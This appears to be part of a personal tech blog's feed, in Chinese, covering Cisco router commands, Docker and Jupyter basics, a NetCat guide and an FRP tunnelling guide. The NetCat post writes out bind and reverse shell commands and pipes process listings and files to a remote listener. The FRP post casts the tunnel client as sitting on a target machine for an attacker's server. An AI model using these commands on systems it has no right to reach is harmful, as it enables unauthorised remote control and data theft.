+<p>router#debug ip pack / 打开 ip 报文的调试</p>
+<p>router#terminal monitor / 输出到终端上显示调试信息</p>
+<p>router#show ip eigrp neighbors / 查看 eigrp 协议的邻居表</p>
+<p>router#show ip eigrp top / 查看 eigrp 协议的拓朴表</p>
+<p>router#show ip eigrp interface / 查看当前路由器运行 eigrp 协议的接口情况</p>
+<p>router#show ip ospf neighbor / 查看当前路由器的 ospf 协议的邻居表</p>
+<p>router#show ip ospf interface / 查看当前路由器运行 ospf 协议的接口情况</p>
+<p>router#clear ip ospf process / 清楚当前路由器 ospf 协议的进程</p>
+<p>router#Show interfaces / 显示设置在路由器和访问服务器上所有接口的统计信息. 显示路由器上配置的所有接口的状态</p>
+<p>router#Show interfaces serial / 显示关于一个串口的信息</p>
+<p>router#Show ip interface / 列出一个接口的 IP 信息和状态的小结, 列出接口的状态和全局参数</p>
+<p>――――――――――――――――――――――――</p>
+<p><strong>CISCO 命令全集　－　思科命令汇总</strong></p>
+<p>Access-enable 允许路由器在动态访问列表中创建临时访问列表入口</p>
+<p>Access-group 把访问控制列表 (ACL) 应用到接口上</p>
+<p>Access-list 定义一个标准的 IP ACL</p>
+<p>Access-template 在连接的路由器上手动替换临时访问列表入口</p>
+<p>Appn 向 APPN 子系统发送命令</p>
+<p>Atmsig 执行 ATM 信令命令</p>
+<p>B 手动引导操作系统</p>
+<p>Bandwidth 设置接口的带宽</p>
+<p>Banner motd 指定日期信息标语</p>
+<p>Bfe 设置突发事件手册模式</p>
+<p>Boot system 指定路由器启动时加载的系统映像</p>
+<p>Calendar 设置硬件日历</p>
+<p>Cd 更改路径</p>
+<p>Cdp enable 允许接口运行 CDP 协议</p>
+<p>Clear 复位功能</p>
+<p>Clear counters 清除接口计数器</p>
+<p>Clear interface 重新启动接口上的硬件逻辑</p>
+<p>Clockrate 设置串口硬件连接的时钟速率，如网络接口模块和接口处理器能接受的速率</p>
+<p>Cmt 开启 / 关闭 FDDI 连接管理功能</p>
+<p>Config-register 修改配置寄存器设置</p>
+<p>Configure 允许进入存在的配置模式，在中心站点上维护并保存<strong>配置信息</strong></p>
+<p>Configure memory 从 NVRAM 加载配置信息</p>
+<p>Configure terminal 从终端进行手动配置</p>
+<p>Connect 打开一个终端连接</p>
+<p>Copy 复制配置或映像数据</p>
+<p>Copy flash tftp 备份系统映像文件到 TFTP 服务器</p>
+<p>Copy running-config startup-config 将 RAM 中的当前配置存储到 NVRAM</p>
+<p>Copy running-config tftp 将 RAM 中的当前配置存储到网络 TFTP 服务器上</p>
+<p>Copy tftp flash 从 TFTP 服务器上下载新映像到 Flash</p>
+<p>Copy tftp running-config 从 TFTP 服务器上下载配置文件</p>
+<p><strong>Debug 使用调试功能</strong></p>
+<p>Debug dialer 显示接口在拨什么号及诸如此类的信息</p>
+<p>Debug ip rip 显示 RIP 路由选择更新数据</p>
+<p>Debug ipx routing activity 显示关于路由选择协议 (RIP) 更新数据包的信息</p>
+<p>Debug ipx sap 显示关于 SAP（业务通告协议）更新数据包信息</p>
+<p>Debug isdn q921 显示在路由器 D 通道 ISDN 接口上发生的数据链路层（第 2 层）的访问过程</p>
+<p>Debug ppp 显示在实施 PPP 中发生的业务和交换信息</p>
+<p>Delete 删除文件</p>
+<p>Deny 为一个已命名的 IP ACL 设置条件</p>
+<p>Dialer idle-timeout 规定线路断开前的空闲时间的长度</p>
+<p>Dialer map 设置一个串行接口来呼叫一个或多个地点</p>
+<p>Dialer wait-for-carrier-time 规定花多长时间等待一个载体</p>
+<p>Dialer-group 通过对属于一个特定拨号组的接口进行配置来访问控制</p>
+<p>Dialer-list protocol 定义一个数字数据接受器（DDR）拨号表以通过协议或 ACL 与协议的组合来控制控制拨号</p>
+<p>Dir 显示给定设备上的文件</p>
+<p>Disable 关闭特许模式</p>
+<p>Disconnect 断开已建立的连接</p>
+<p>Enable 打开特许模式</p>
+<p>Enable password 确定一个密码以防止对路由器非授权的访问</p>
+<p>Enable password 设置本地口令控制不同特权级别的访问</p>
+<p>Enable secret 为 enable password 命令定义额外一层安全性</p>
+<p>Encapsulation frame-relay 启动帧中继封装</p>
+<p>Encapsulation novell-ether 规定在网络段上使用的 Novell 独一无二的格式</p>
+<p>Encapsulation PPP 把 PPP 设置为由串口或 ISDN 接口使用的封装方法</p>
+<p>Encapsulation sap 规定在网络段上使用的以太网 802.2 格式 Cisco 的密码是 sap</p>
+<p>End 退出配置模式</p>
+<p>Erase 删除闪存或配置缓存</p>
+<p>Erase startup-config 删除 NVRAM 中的内容</p>
+<p>Exec-timeout 配置 EXEC 命令解释器在检测到用户输入前所等待的时间</p>
+<p>Exit 退出所有配置模式或者关闭一个激活的终端会话和终止一个 EXEC</p>
+<p>Exit 终止任何配置模式或关闭一个活动的对话和结束 EXEC</p>
+<p>format 格式化设备</p>
+<p>Frame-relay local-dlci 为使用帧中继封装的串行线路启动本地管理接口（LMI）</p>
+<p>Help 获得交互式帮助系统</p>
+<p>History 查看历史记录</p>
+<p>Hostname 使用一个主机名来配置路由器，该主机名以提示符或者缺省文件名的方式使用</p>
+<p>Interface 设置接口类型并且输入接口配置模式</p>
+<p>Interface 配置接口类型和进入接口配置模式</p>
+<p>Interface serial 选择接口并且输入接口配置模式</p>
+<p>Ip access-group 控制对一个接口的访问</p>
+<p>Ip address 设定接口的网络逻辑地址</p>
+<p>Ip address 设置一个接口地址和子网掩码并开始 IP 处理</p>
+<p>Ip default-network 建立一条缺省路由</p>
+<p>Ip domain-lookup 允许路由器缺省使用 DNS</p>
+<p>Ip host 定义静态主机名到 IP 地址映射</p>
+<p>Ip name-server 指定至多 6 个进行名字 - 地址解析的服务器地址</p>
+<p>Ip route 建立一条静态路由</p>
+<p>Ip unnumbered 在为给一个接口分配一个明确的 IP 地址情况下，在串口上启动互联网协议（IP）的处理过程</p>
+<p>Ipx delay 设置点计数</p>
+<p>Ipx ipxwan 在串口上启动 IPXWAN 协议</p>
+<p>Ipx maximum-paths 当转发数据包时设置 Cisco IOS 软件使用的等价路径数量</p>
+<p>Ipx network 在一个特定接口上启动互联网数据包交换（IPX）的路由选择并且选择封装的类型（用帧封装）</p>
+<p>Ipx router 规定使用的路由选择协议</p>
+<p>Ipx routing 启动 IPX 路由选择</p>
+<p>Ipx sap-interval 在较慢的链路上设置较不频繁的 SAP（业务广告协议）更新</p>
+<p>Ipx type-20-input-checks 限制对 IPX20 类数据包广播的传播的接受</p>
+<p>Isdn spid1 在路由器上规定已经由 ISDN 业务供应商为 B1 信道分配的业务简介号（SPID）</p>
+<p>Isdn spid2 在路由器上规定已经由 ISDN 业务供应商为 B2 信道分配的业务简介号（SPID）</p>
+<p>Isdn switch-type 规定了在 ISDN 接口上的中央办公区的交换机的类型</p>
+<p>Keeplive 为使用帧中继封装的串行线路 LMI（本地管理接口）机制</p>
+<p>Lat 打开 LAT 连接</p>
+<p>Line 确定一个特定的线路和开始线路配置</p>
+<p>Line concole 设置控制台端口线路</p>
+<p>Line vty 为远程控制台访问规定了一个虚拟终端</p>
+<p>Lock 锁住终端控制台</p>
+<p>Login 在终端会话登录过程中启动了密码检查</p>
+<p>Login 以某用户身份登录，登录时允许口令验证</p>
+<p>Mbranch 向下跟踪组播地址路由至终端</p>
+<p><strong>Media-type 定义介质类型</strong></p>
+<p>Metric holddown 把新的 IGRP 路由选择信息与正在使用的 IGRP 路由选择信息隔离一段时间</p>
+<p>Mrbranch 向上解析组播地址路由至枝端</p>
+<p>Mrinfo 从组播路由器上获取邻居和版本信息</p>
+<p>Mstat 对组播地址多次路由跟踪后显示统计数字</p>
+<p>Mtrace 由源向目标跟踪解析组播地址路径</p>
+<p>Name-connection 命名已存在的网络连接</p>
+<p>Ncia 开启 / 关闭 NCIA 服务器</p>
+<p>Network 把一个基于 NIC 的地址分配给一个与它直接相连的路由器把网络与一个 IGRP 的路由选择的过程联系起来在 IPX 路由器配置模式下，在网络上启动加强的 IGRP</p>
+<p>Network 指定一个和路由器直接相连的网络地址段</p>
+<p>Network-number 对一个直接连接的网络进行规定</p>
+<p>No shutdown 打开一个关闭的接口</p>
+<p>Pad 开启一个 X.29 PAD 连接</p>
+<p>Permit 为一个已命名的 IP ACL 设置条件</p>
+<p>Ping 把 ICMP 响应请求的数据包发送网络上的另一个节点检查主机的可达性和网络的连通性对网络的基本连通性进行诊断</p>
+<p>Ping 发送回声请求，诊断基本的网络连通性</p>
+<p>Ppp 开始 IETF 点到点协议</p>
+<p>Ppp authentication 启动 Challenge 握手鉴权协议（CHAP）或者密码验证协议（PAP）或者将两者都启动，并且对在接口上选择的 CHAP 和 PAP 验证的顺序进行规定</p>
+<p>Ppp chap hostname 当用 CHAP 进行身份验证时，创建一批好像是同一台主机的拨号路由器</p>
+<p>Ppp chap password 设置一个密码，该密码被发送到对路由器进行身份验证的主机命令对进入路由器的用户名 / 密码的数量进行了限制</p>
+<p>Ppp pap sent-username 对一个接口启动远程 PAP 支持，并且在 PAP 对同等层请求数据包验证过程中使用 sent-username 和 password</p>
+<p>Protocol 对一个 IP 路由选择协议进行定义，该协议可以是 RIP，内部网关路由选择协议（IGRP），开放最短路径优先（OSPF），还可以是加强的 IGRP</p>
+<p>Pwd 显示当前设备名</p>
+<p>Reload 关闭并执行冷启动；重启操作系统</p>
+<p>Rlogin 打开一个活动的网络连接</p>
+<p>Router 由第一项定义的 IP 路由协议作为路由进程，例如：router rip 选择 RIP 作为路由协议</p>
+<p>Router igrp 启动一个 IGRP 的路由选择过程</p>
+<p>Router rip 选择 RIP 作为路由选择协议</p>
+<p>Rsh 执行一个远程命令</p>
+<p>Sdlc 发送 SDLC 测试帧</p>
+<p>Send 在 tty 线路上发送消息</p>
+<p>Service password-encryption 对口令进行加密</p>
+<p>Setup 运行 Setup 命令</p>
+<p>Show 显示运行系统信息</p>
+<p>Show access-lists 显示当前所有 ACL 的内容</p>
+<p>Show buffers 显示缓存器统计信息</p>
+<p>Show cdp entry 显示 CDP 表中所列相邻设备的信息</p>
+<p>Show cdp interface 显示打开的 CDP 接口信息</p>
+<p>Show cdp neighbors 显示 CDP 查找进程的结果</p>
+<p>Show dialer 显示为 DDR（数字数据接受器）设置的串行接口的一般诊断信息</p>
+<p>Show flash 显示闪存的布局和内容信息</p>
+<p>Show frame-relay lmi 显示关于本地管理接口（LMI）的统计信息</p>
+<p>Show frame-relay map 显示关于连接的当前映射入口和信息</p>
+<p>Show frame-relay pvc 显示关于帧中继接口的永久虚电路（pvc）的统计信息</p>
+<p>Show hosts 显示主机名和地址的缓存列表</p>
+<p>Show ip protocols 显示活动路由协议进程的参数和当前状态</p>
+<p>Show ip route 显示路由选择表的当前状态</p>
+<p>Show ip router 显示 IP 路由表信息</p>
+<p>Show ipx interface 显示 Cisco IOS 软件设置的 IPX 接口的状态以及每个接口中的参数</p>
+<p>Show ipx route 显示 IPX 路由选择表的内容</p>
+<p>Show ipx servers 显示 IPX 服务器列表</p>
+<p>Show ipx traffic 显示数据包的数量和类型</p>
+<p>Show isdn active 显示当前呼叫的信息，包括被叫号码、建立连接前所花费的时间、在呼叫期间使用的自动化操作控制（AOC）收费单元以及是否在呼叫期间和呼叫结束时提供 AOC 信息</p>
+<p>Show isdn ststus 显示所有 isdn 接口的状态、或者一个特定的数字信号链路（DSL）的状态或者一个特定 isdn 接口的状态</p>
+<p>Show memory 显示路由器内存的大小，包括空闲内存的大小</p>
+<p>Show processes 显示路由器的进程</p>
+<p>Show protocols 显示设置的协议</p>
+<p>Show protocols 显示配置的协议。这条命令显示任何配置了的第 3 层协议的状态</p>
+<p>Show running-config 显示 RAM 中的当前配置信息</p>
+<p>Show spantree 显示关于虚拟局域网（VLAN）的生成树信息</p>
+<p>Show stacks 监控和中断程序对堆栈的使用，并显示系统上一次重启的原因</p>
+<p>Show startup-config 显示 NVRAM 中的启动配置文件</p>
+<p>Show ststus 显示 ISDN 线路和两个 B 信道的当前状态</p>
+<p>Show version 显示系统硬件的配置，软件的版本，配置文件的名称和来源及引导映像</p>
+<p>Shutdown 关闭一个接口</p>
+<p>Telnet 开启一个 telect 连接</p>
+<p>Term ip 指定当前会话的网络掩码的格式</p>
+<p>Term ip netmask-format 规定了在 show 命令输出中网络掩码显示的格式</p>
+<p>Timers basic 控制着 IGRP 以多少时间间隔发送更新信息</p>
+<p>Trace 跟踪 IP 路由</p>
+<p>Username password 规定了在 CHAP 和 PAP 呼叫者身份验证过程中使用的密码</p>
+<p>Verify 检验 flash 文件</p>
+<p>Where 显示活动连接</p>
+<p>Which-route OSI 路由表查找和显示结果</p>
+<p>Write 运行的配置信息写入内存，网络或终端</p>
+<p>Write erase 现在由 copy startup-config 命令替换</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[使用Docker镜像]]></title>
+        <id>https://MaHule.github.io/shi-yong-docker-jing-xiang/</id>
+        <link href="https://MaHule.github.io/shi-yong-docker-jing-xiang/">
+        </link>
+        <updated>2020-10-11T08:43:59.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="31-获取镜像">3.1 获取镜像</h2>
+<pre><code class="language-docker">#使用docker pull 直接从Docker Hub下载镜像。格式为docker pull NAME:[tag](名称：标签)
+$ docker pull ubuntu:18.04
+#如果后面没有带有标签，默认下载最新版本
+$docker pull ubuntu  默认下载ubuntu的最新版本
+
+#名称前面可以带仓库地址作为，没有带默认为Docker Hub服务，前面没有带默认是 registry.hub.docker.com/ubuntu:18.04。可以带有仓库地址。
+$docker pull hub.c.163.com/public/ubuntu:18.04  从网易蜂巢镜像源下载镜像
+</code></pre>
+<pre><code>#使用镜像，打印“Hello World”
+$docker run -it ubuntu:18.04 bash
+</code></pre>
+<h2 id="32-查看镜像信息">3.2 查看镜像信息</h2>
+<pre><code>#1. 使用images命令列出镜像
+$ docker images / docker image ls
+</code></pre>
+<p><strong>注：</strong> 镜像ID唯一标识镜像</p>
+<pre><code class="language-docker">#2. 使用tag命令添加镜像标签
+$docker tag mysqli acgpiano/sqli-labs
+</code></pre>
+<p><strong>注：</strong> 实际上指向了同一个镜像文件，只是别名不同而已。docker tag命令添加的标签实际上起到了类似链接的作用。</p>
+<pre><code>#3. inspect命令查看详细信息
+$docker inspect Ubuntu:18.04     返回的是一个json格式的消息
+
+#可以使用-f命令来指定显示部分信息
+$docker inspect -f {{&quot;.Architecture&quot;}} ubuntu:18.04
+
+</code></pre>
+<pre><code>#4.使用history命令查看镜像历史
+$docker history ubuntu:18.04
+
+</code></pre>
+<p>**注：**过长的命令会被自动截断，可以使用<code>--no-trunc</code>选项来输出完整命令</p>
+<h2 id="33-搜寻镜像">3.3 搜寻镜像</h2>
+<p>Docker镜像的search子命令。使用dockersearch命令可以搜索Docker Hub官方仓库中的镜像。语法为docker search keyword。支持的命令选项主要包括：</p>
+<ul>
+<li>-f, --filter filter：过滤输出内容；</li>
+<li>--format string：格式化输出内容；</li>
+<li>--limit int：限制输出结果个数，默认为25个；</li>
+<li>--no-trunc：不截断输出结果。</li>
+</ul>
+<pre><code>#1.直接搜寻
+$docker search ubuntu
+
+#2.查找官方提供的带nginx关键字的镜像
+$docker search --filter=is-official=true nginx
+
+#3.搜索收藏数超过4的关键字包括tensorflow的镜像
+$docker search --filter=stars=4 tensorflow
+</code></pre>
+<h2 id="34-删除和清理镜像">3.4 删除和清理镜像</h2>
+<blockquote>
+<p>docker镜像的rm和prune子命令</p>
+</blockquote>
+<ol>
+<li>使用标签删除镜像</li>
+</ol>
+<p>使用<code>docker rmi</code>或者<code>docker image rm</code>删除镜像。可以使用镜像名称或者ID删除。</p>
+<ul>
+<li>-f,-force：强制删除镜像，即使有容器依赖它</li>
+<li>-no-prune：不要清理未带标签的副镜像</li>
+</ul>
+<pre><code>#删除标签为mysqli镜像
+$docker rmi mysqli
+</code></pre>
+<p><strong>注：</strong> 当同一个镜像拥有多个标签的时候，docker rmi命令只是删除了该镜像多个标签中的指定标签而已，并不影响镜像文件。</p>
+<ol start="2">
+<li>使用镜像ID来删除镜像</li>
+</ol>
+<p>使用镜像ID来删除镜像时，会先尝试删除所有指向该镜像的标签，然后删除该镜像本身。<strong>当有该镜像创建的容器存在时，镜像文件默认是无法被删除的。</strong>（即运行中的镜像是无法删除的）</p>
+<ol start="3">
+<li>清理镜像</li>
+</ol>
+<p>使用Docker一段时间后，系统中可能会遗留一些临时的镜像文件，以及一些没有被使用的镜像，可以通过docker imageprune命令来进行清理。</p>
+<ul>
+<li>-a,-all：删除所有无用镜像，不光是临时镜像</li>
+<li>-filter filter：只清理符合给定过滤器的镜像</li>
+<li>-f,-force：强制删除镜像，而不提示确认</li>
+</ul>
+<pre><code>#自动清理临时的遗留镜像文件层，最后会提示释放存储空间
+$docker image prune -f
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Jupyter基本使用]]></title>
+        <id>https://MaHule.github.io/jupyter-ji-ben-shi-yong/</id>
+        <link href="https://MaHule.github.io/jupyter-ji-ben-shi-yong/">
+        </link>
+        <updated>2020-10-11T08:37:39.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="一-更改默认目录">一. 更改默认目录</h2>
+<ol>
+<li>启动<code>cmd</code>，执行<code>jupyter notebook --generate-config</code>，查看jupyter配置文件路径</li>
+<li>找到配置文件<code>jupyter_notebook_config.py</code></li>
+<li>修改配置文件</li>
+</ol>
+<p>找到一下语句：</p>
+<pre><code>## The directory to use for notebooks and kernels. 
+# c.NotebookApp.notebook_dir = '' 
+将其改为 
+## The directory to use for notebooks and kernels. 
+c.NotebookApp.notebook_dir = '需要更改的路径'
+</code></pre>
+<p><strong>注：</strong> 路径 中不能出现中文</p>
+<ol start="4">
+<li>找到Jupyter的快捷方式，右键属性，将<code>%USERPROFILE%</code>删除保持。</li>
+</ol>
+<h2 id="二更改jupyter的主题">二.更改jupyter的主题</h2>
+<ol>
+<li>安装Jupyter主题<code>pip install jupyterthemes</code>。</li>
+<li>更新Jupyter主题<code>pip install --upgrade jupyterthemes</code></li>
+<li>查看可用的Jupyter主题 <code>jt -l</code></li>
+<li>更换Jupyter主题</li>
+</ol>
+<p><code> jt -t onedork -f fira -fs 13 -cellw 90% -ofs 11 -dfs 11 -T -T</code></p>
+<p>​        -t 主题 -f(字体) -fs(字体大小) -cellw(占屏比或宽度) -ofs(输出段的字号) -T(显示工具栏) -T(显示自己主机名)</p>
+<ol start="5">
+<li>恢复Jupyter默认风格</li>
+</ol>
+<pre><code>jt -r
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Docker基本知识]]></title>
+        <id>https://MaHule.github.io/docker-ji-ben-zhi-shi/</id>
+        <link href="https://MaHule.github.io/docker-ji-ben-zhi-shi/">
+        </link>
+        <updated>2020-10-09T02:22:34.000Z</updated>
+        <summary type="html"><![CDATA[<h2 id="1-安装docker">1. 安装Docker</h2>
+<h4 id="windows安装docker">Windows安装Docker</h4>
+<ul>
+<li>使用dockertoolbox安装，需要依赖virtualbox</li>
+</ul>
+<ol>
+<li>第一次安装初始化需要下载<code>boot2docker.iso</code>镜像，直接下载比较慢，可以直接使用网盘下载后移动到相应的文件夹</li>
+<li></li>
+</ol>
+<ul>
+<li>使用Docker for windows安装</li>
+</ul>
+<ol>
+<li>需要依赖Windows开启Hyper-V</li>
+<li>可以添加镜像加速器，使下载镜像时的速度更快</li>
+</ol>
+<h2 id="2-dcoker的基本使用">2. Dcoker的基本使用</h2>
+<p>以拉取与运行Sqli-Lab为例来对Docker的使用进行介绍</p>
+<ul>
+<li>寻找镜像：<code>docker search sqli-lab</code></li>
+<li>拉取镜像：<code>docker pull acgpiano/sqli-labs</code></li>
+<li>查看本地已经存在的镜像：<code>docker images</code></li>
+<li>为镜像添加标签：<code>docker tag acgpiano/sqli-labs mysqli </code></li>
+<li>运行docker下的sqli-labs: <code>docker run -dt --name sqli -p 80:80 --rm acgpiano/sqli-labs</code></li>
+</ul>
+<blockquote>
+<p><code>--dt</code> ：让其在后台运行</p>
+<p><code>--name</code> ：给运行的镜像命名</p>
+<p><code>-p</code>： 将运行镜像的端口映射到本地主机的端口上，前面的是本地主机端口，后面是镜像端口</p>
+</blockquote>
+<ul>
+<li>显示容器的<code>id</code>,<code>image</code>命令，端口等信息：<code>docker ps -a</code></li>
+<li>进入id号的shell： <code>docker exec -it 0976afc45249 /bin/bash</code></li>
+</ul>
+]]></summary>
+        <content type="html"><![CDATA[<h2 id="1-安装docker">1. 安装Docker</h2>
+<h4 id="windows安装docker">Windows安装Docker</h4>
+<ul>
+<li>使用dockertoolbox安装，需要依赖virtualbox</li>
+</ul>
+<ol>
+<li>第一次安装初始化需要下载<code>boot2docker.iso</code>镜像，直接下载比较慢，可以直接使用网盘下载后移动到相应的文件夹</li>
+<li></li>
+</ol>
+<ul>
+<li>使用Docker for windows安装</li>
+</ul>
+<ol>
+<li>需要依赖Windows开启Hyper-V</li>
+<li>可以添加镜像加速器，使下载镜像时的速度更快</li>
+</ol>
+<h2 id="2-dcoker的基本使用">2. Dcoker的基本使用</h2>
+<p>以拉取与运行Sqli-Lab为例来对Docker的使用进行介绍</p>
+<ul>
+<li>寻找镜像：<code>docker search sqli-lab</code></li>
+<li>拉取镜像：<code>docker pull acgpiano/sqli-labs</code></li>
+<li>查看本地已经存在的镜像：<code>docker images</code></li>
+<li>为镜像添加标签：<code>docker tag acgpiano/sqli-labs mysqli </code></li>
+<li>运行docker下的sqli-labs: <code>docker run -dt --name sqli -p 80:80 --rm acgpiano/sqli-labs</code></li>
+</ul>
+<blockquote>
+<p><code>--dt</code> ：让其在后台运行</p>
+<p><code>--name</code> ：给运行的镜像命名</p>
+<p><code>-p</code>： 将运行镜像的端口映射到本地主机的端口上，前面的是本地主机端口，后面是镜像端口</p>
+</blockquote>
+<ul>
+<li>显示容器的<code>id</code>,<code>image</code>命令，端口等信息：<code>docker ps -a</code></li>
+<li>进入id号的shell： <code>docker exec -it 0976afc45249 /bin/bash</code></li>
+</ul>
+<!-- more -->
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[NetCat使用指南]]></title>
+        <id>https://MaHule.github.io/netcat-shi-yong-zhi-nan/</id>
+        <link href="https://MaHule.github.io/netcat-shi-yong-zhi-nan/">
+        </link>
+        <updated>2020-04-15T00:39:24.000Z</updated>
+        <summary type="html"><![CDATA[<p>NC(netcat)被称为网络工具中的瑞士军刀，体积小巧，但功能强大</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>NC(netcat)被称为网络工具中的瑞士军刀，体积小巧，但功能强大</p>
+<!-- more -->
+<h4 id="主要功能">主要功能</h4>
+<blockquote>
+<p>可以在两台设备上面相互交互，即侦听模式/传输模式</p>
+</blockquote>
+<ul>
+<li>Telnet功能</li>
+<li>获取banner信息</li>
+<li>传输文本信息</li>
+<li>传输文件/目录</li>
+<li>加密传输文件，默认不加密</li>
+<li>远程控制</li>
+<li>加密所有流量</li>
+<li>流媒体服务器</li>
+</ul>
+<h3 id="具体介绍">具体介绍</h3>
+<p><code>nc -h</code> 查看nc的传输说明：</p>
+<figure data-type="image" tabindex="1"><img src="https://MaHule.github.io/post-images/netcat/01.png" alt="netcat" loading="lazy"></figure>
+<h4 id="01-nc远程控制">01. NC远程控制</h4>
+<p>正向连接：</p>
+<pre><code class="language-bash">A: nc -lp 需要开放端口 -c bash   #服务器开放端口，等待连接
+
+B: nc ip:port     #客户机连接服务器
+
+#A将自己的bash发送给B
+</code></pre>
+<p>反向连接：</p>
+<pre><code class="language-bash">A: nc -lp port 
+
+B: nc ip port -c bash
+
+#B将自己的bash发给A
+</code></pre>
+<p><strong>注：</strong> Windows下需要将Bash换成cmd</p>
+<h4 id="02-使用nc进行信息收集">02. 使用NC进行信息收集</h4>
+<ol>
+<li>简单的建立连接（双方可以进行文本信息的交换）</li>
+</ol>
+<pre><code class="language-bash">A: nc -l -p port     #监听指定端口号
+
+B: nc -nv ip port    #连接对方tcp端口，默认情况下，双方可以发送文本信息 
+</code></pre>
+<ol start="2">
+<li>收集目标主机上的进程信息</li>
+</ol>
+<pre><code class="language-bash">nc -l -p 4444 &gt; wing.txt     #将远程发送过来的内容保存在本地
+
+ps -aux | nc -nv ip port -q 1  #标准输入完成后delay一秒钟，会发送到侦听端
+</code></pre>
+<h4 id="03-nc传输文件">03. NC传输文件</h4>
+<pre><code class="language-bash">A: nc -lp 4444 &gt; 1.txt     #打开4444端口，将接受到的数据保存为1.txt
+
+B: nc -nv ip port &lt; 1.txt -q 1  #将文件发送给侦听端
+
+#PS：侦听端口接受的文件名最好于发送端发送文件的名字一致
+
+</code></pre>
+<h4 id="04nc文件加密传输">04.NC文件加密传输</h4>
+<pre><code class="language-bash">A: nc -lp port | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; 文件名
+
+B: mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; 文件名 | nc -nv ip port -q 1
+</code></pre>
+<p><strong>注：</strong> B将文件加密发送，A接受后先保存到本地，B在一秒后退出。加密方式利用的是mcrypt加密</p>
+<h4 id="05-nc流媒体服务">05. NC流媒体服务</h4>
+<pre><code class="language-bash">A: cat wing.mp4 | nc -lp port    #用cat打开视频文件，然后将视频文件通过nc发送
+
+B: nc -nv ip port | mplayer -vo x11 -cache 4000  #将接收到的流媒体文件通过mplayer（是一个视频的播放器）打开。
+</code></pre>
+<h4 id="06-nc端口扫描">06. NC端口扫描</h4>
+<pre><code class="language-bash">nc -nvz ip 1-65535      #扫描tcp中1-65535端口的开放情况
+</code></pre>
+<pre><code class="language-bash">nc -nvzu ip 1-65535     #扫描udp中1-65535端口的开放情况
+</code></pre>
+<h4 id="07nc复制磁盘">07.NC复制磁盘</h4>
+<pre><code class="language-bash">A: nc -lp port | dd of=/dev/sda
+
+B: dd if=/dev/sda | nc -nc ip port -q 1
+
+if = input filter
+of = output filter
+
+
+#B将数据复制到A挂载的硬盘上
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[内网穿透神器:FRP]]></title>
+        <id>https://MaHule.github.io/内网穿透神器：FRP/</id>
+        <link href="https://MaHule.github.io/内网穿透神器：FRP/">
+        </link>
+        <updated>2020-04-15T00:39:24.000Z</updated>
+        <content type="html"><![CDATA[<pre><code>项目地址：https://github.com/fatedier/frp
+</code></pre>
+<p>推荐一款很好用的内网穿透工具</p>
+<p>支持 http,https,tcp,udp 等协议</p>
+<p><strong>0x01 配置</strong></p>
+<p>下载好之后打开压缩包，重点关注以下几个文件即可</p>
+<pre><code>frpc.exe
+frpc.ini
+frps.exe
+frps.ini
+</code></pre>
+<p>frpc 是放在客户端（靶机）上，frps 放在服务端（攻击机）上</p>
+<p>首先说 frps 配置</p>
+<pre><code># frps.ini
+[common]
+bind_port = 7000 #必要，frp服务端端口
+vhost_http_port = 8080 #如果需要http协议需要指定一个端口
+token = 12345678 #非必要，如果加了客户端也要写一样的token
+dashboard_port = 7500 #仪表盘端口，加了就是开启了
+dashboard_user = admin #仪表盘账号，如果没开仪表盘就没必要加
+dashboard_pwd = admin #仪表盘密码，同上
+vhost_https_port = 8443 #https协议
+max_pool_count = 20 #最大连接数，非必要
+
+</code></pre>
+<p>可以像 nginx 同一个端口用于多个网站</p>
+<p>然后执行命令启动服务</p>
+<pre><code>./frps -c frps.ini
+</code></pre>
+<p>接下来说 frpc</p>
+<pre><code>[common]
+server_addr = 公网ip
+server_port = 7000 #之前填写的bind_port
+[web] #名字，没有固定要求可以随便写
+type = tcp #协议
+local_ip = 127.0.0.1 #需要转发的端口ip地址
+local_port = 80 #需要转发的端口
+remote_port = 8000 #指定远程服务器的端口
+[web1]
+type = http #这里使用http协议
+local_ip = 127.0.0.1
+local_port = 81
+custom_domains = 公网ip解析的域名，必填
+
+</code></pre>
+<p>上面举了两个例子，如果公网服务器没有域名，可以使用 tcp 协议</p>
+<p>如果要用 http 协议需要公网 ip 有域名，不用设置远程端口，都是映射到之前的 vhost_http_port 上，https 同理，填写的域名就可以了，可以填写多个子域名，记得要解析</p>
+<p>启动服务</p>
+<pre><code>./frpc -c frpc.ini
+</code></pre>
+<p>常用的配置就是这些了，项目下面有很详细的解释，还有一些详细参数</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Vi （终端中的编辑器）]]></title>
+        <id>https://MaHule.github.io/vi-zhong-duan-zhong-de-bian-ji-qi/</id>
+        <link href="https://MaHule.github.io/vi-zhong-duan-zhong-de-bian-ji-qi/">
+        </link>
+        <updated>2020-04-14T06:05:02.000Z</updated>
+        <summary type="html"><![CDATA[<p>vi是linux中最常用的编辑器。是了解使用Linux的必备的知识</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>vi是linux中最常用的编辑器。是了解使用Linux的必备的知识</p>
+<!-- more -->
+<h2 id="目标">目标</h2>
+<ul>
+<li><code>vi</code> 简介</li>
+<li>打开和新建文件</li>
+<li>三种工作模式</li>
+<li>常用命令</li>
+<li>分屏命令</li>
+<li>常用命令速查图</li>
+</ul>
+<h2 id="01-vi-简介">01. <code>vi</code> 简介</h2>
+<h3 id="11-学习-vi-的目的">1.1 学习 <code>vi</code> 的目的</h3>
+<ul>
+<li>在工作中，要对 <strong>服务器</strong> 上的文件进行 <strong>简单</strong> 的修改，可以使用 <code>ssh</code> 远程登录到服务器上，并且使用 <code>vi</code> 进行快速的编辑即可</li>
+<li>常见需要修改的文件包括：
+<ul>
+<li><strong>源程序</strong></li>
+<li><strong>配置文件</strong>，例如 <code>ssh</code> 的配置文件 <code>~/.ssh/config</code></li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<ul>
+<li>在没有图形界面的环境下，要编辑文件，<code>vi</code> 是最佳选择！</li>
+<li>每一个要使用 Linux 的程序员，都应该或多或少的学习一些 <code>vi</code> 的常用命令</li>
+</ul>
